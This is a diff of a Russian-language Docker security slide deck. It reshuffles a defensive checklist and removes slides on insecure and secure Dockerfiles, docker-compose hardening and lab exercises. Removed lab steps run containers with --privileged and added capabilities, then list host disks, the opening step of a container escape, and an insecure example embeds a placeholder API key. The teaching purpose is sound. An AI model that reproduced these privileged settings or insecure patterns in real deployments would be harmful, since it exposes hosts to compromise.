-    - trivy image --exit-code 1 --severity CRITICAL myapp:latest
+git clone https://github.com/docker/docker-bench-security.git
+cd docker-bench-security
+sudo sh docker-bench-security.sh
 ```
 
 ---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item done">Лучшие практики</div>
+  <div class="timeline-item current">Инструменты</div>
+</div>
 
 ## Методы защиты: Краткий чеклист
 
-**Конфигурация контейнеров:**
+✅ Никогда не используйте `--privileged` в продакшене
+✅ Минимизируйте capabilities: `--cap-drop=ALL`
+✅ Не монтируйте docker.sock без необходимости
+✅ Используйте read-only файловую систему где возможно
 
-- Никогда не используйте `--privileged` в продакшене
-- Минимизируйте capabilities: `--cap-drop=ALL`
-- Не монтируйте docker.sock без необходимости
-- Используйте read-only файловую систему где возможно
+✅ Регулярно сканируйте образы (Trivy/Scout в CI/CD)
+✅ Используйте минимальные базовые образы (alpine, distroless)
+✅ Обновляйте Docker и образы
+✅ Не храните секреты в образах
 
-**Образы и обновления:**
+<!-- --- -->
 
-- Регулярно сканируйте образы (Trivy/Scout в CI/CD)
-- Используйте минимальные базовые образы (alpine, distroless)
-- Обновляйте Docker и образы
-- Не храните секреты в образах
-
-**Мониторинг:**
-
-- Docker Bench Security для аудита конфигурации
-- Логирование и алертинг на подозрительную активность
-
----
+<!--
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item done">Лучшие практики</div>
+  <div class="timeline-item current">Инструменты</div>
+</div>
 
 ## Полезные инструменты
 
@@ -464,154 +1066,14 @@ trivy_scan:
 - Docker Scout - встроенный в Docker
 - Grype, Snyk - альтернативы
 
----
-
-## Безопасный Dockerfile: Плохой пример
-
-```dockerfile
-# ❌ НЕБЕЗОПАСНО
-FROM ubuntu:latest
-
-# Root пользователь по умолчанию
-RUN apt-get update && apt-get install -y python3 curl
-
-# Секреты в образе
-ENV API_KEY="sk-1234567890abcdef"
-
-# Установка всех пакетов
-COPY requirements.txt .
-RUN pip install -r requirements.txt
-
-COPY app.py .
-
-CMD ["python3", "app.py"]
-```
-
-**Проблемы:** latest тег, root, секреты в ENV, большой образ
-
----
-
-## Безопасный Dockerfile: Хороший пример
-
-```dockerfile
-# ✅ БЕЗОПАСНО
-FROM python:3.11-alpine AS builder
-
-WORKDIR /app
-COPY requirements.txt .
-RUN pip install --no-cache-dir --user -r requirements.txt
-
-# Multi-stage: минимальный финальный образ
-FROM python:3.11-alpine
-
-# Non-root пользователь
-RUN addgroup -g 1000 appgroup && \
-    adduser -D -u 1000 -G appgroup appuser
-
-WORKDIR /app
-COPY --from=builder --chown=appuser:appgroup /root/.local /home/appuser/.local
-COPY --chown=appuser:appgroup app.py .
-
-USER appuser
-
-# Read-only filesystem
-# Используйте: docker run --read-only --tmpfs /tmp myapp
-
-CMD ["python3", "app.py"]
-```
-
----
-
-## Безопасный Dockerfile
-
-Попробуем!
-
-```
-docker run -it --privileged --name ctf-task1 --user appuser:appuser ubuntu-unpriveleged-user
-```
-
-1. Установите утилиту для работы с дисками`apt-get update` `apt-get -y install fdisk`
-2. Проверьте доступные диски: `fdisk -l`
-
-> Уменьшение поверхности атаки — даже внутри контейнера непривилегированный пользователь не может менять системные файлы, устанавливать пакеты, менять сетевые настройки.
-
----
-
-## Безопасный Dockerfile: Лучшие практики
-
-**Используйте:**
-
-✅ Конкретные теги версий (`python:3.11-alpine`, не `latest`)
-✅ Минимальные базовые образы (`alpine`, `distroless`)
-✅ Multi-stage builds для уменьшения размера
-✅ Non-root пользователя
-✅ `.dockerignore` для исключения чувствительных файлов
-
-**Избегайте:**
-
-❌ `latest` тега
-❌ Запуска от root
-❌ Хранения секретов в образе (используйте secrets management)
-❌ Установки ненужных пакетов
-
----
-
-## docker-compose.yml: Хороший пример
-
-```yaml
-# ✅ БЕЗОПАСНО
-services:
-  app:
-    image: myapp:1.2.3 # Конкретная версия
-    read_only: true # Read-only filesystem
-    tmpfs:
-      - /tmp
-    cap_drop:
-      - ALL
-    cap_add:
-      - NET_BIND_SERVICE # Только необходимые capabilities
-    security_opt:
-      - no-new-privileges:true
-    user: "1000:1000" # Non-root
-    volumes:
-      - ./data:/app/data:ro # Read-only монтирование
-    environment:
-      - DATABASE_HOST=db
-    secrets:
-      - db_password # Используем Docker secrets
-
-secrets:
-  db_password:
-    file: ./secrets/db_password.txt
-```
-
----
-
-## cap_drop
-
-Пробуем!
-
-```
-docker run -it --privileged --name ctf-task1 --user appuser:appuser --cap-add=CHOWN --cap-add=SETUID --cap-add=SETGID --cap-add=FOWNER --cap-add=DAC_OVERRIDE ubuntu-unpriveleged-user
-```
-
-1. Установите утилиту для работы с дисками`apt-get update` `apt-get -y install fdisk`
-2. Проверьте доступные диски: `fdisk -l`
-
----
-
-## docker-compose.yml: Лучшие практики
-
-**Network изоляция:**
-
-```yaml
-networks:
-  frontend:
-  backend:
-    internal: true # Без доступа в интернет
-```
-
----
+--- -->
+<!--
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item done">Лучшие практики</div>
+  <div class="timeline-item current">Инструменты</div>
+</div>
 
 ## Ресурсы для дальнейшего изучения
 
@@ -625,14 +1087,23 @@ networks:
 
 - HackTheBox - Docker escape challenges
 - TryHackMe - Container Security room
-- [Play with Docker](https://labs.play-with-docker.com/) - песочница
+- [Play with Docker](https://labs.play-with-docker.com/) - песочница -->
+
+<!-- ---
 
 **Инструменты:**
 
 - Trivy: https://github.com/aquasecurity/trivy
-- Docker Bench: https://github.com/docker/docker-bench-security
+- Docker Bench: https://github.com/docker/docker-bench-security -->
 
 ---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item done">Лучшие практики</div>
+  <div class="timeline-item done">Инструменты</div>
+</div>
 
 ## Заключение
 
